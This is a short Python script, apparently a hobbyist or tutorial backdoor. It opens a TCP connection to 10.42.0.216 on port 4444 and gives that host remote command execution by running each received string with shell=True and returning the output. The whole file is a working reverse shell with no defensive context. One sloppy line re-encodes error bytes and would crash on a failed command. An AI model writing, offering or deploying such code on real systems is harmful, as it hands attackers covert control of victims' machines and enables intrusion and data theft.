import socket
import subprocess

def execute(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode()  # Decode the byte string to a regular string
    except subprocess.CalledProcessError as e:
        return str(e).encode()  # If there's an error, send the error message as a byte string

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.42.0.216", 4444)) #put your own machine ip

a = "connection established"
connection.send(a.encode())
while True:
    received_data = connection.recv(1024).decode()  # Decode the received data to a regular string
    result = execute(received_data)
    if result is not None:
        connection.send(result.encode())  # Encode the result as a byte string before sending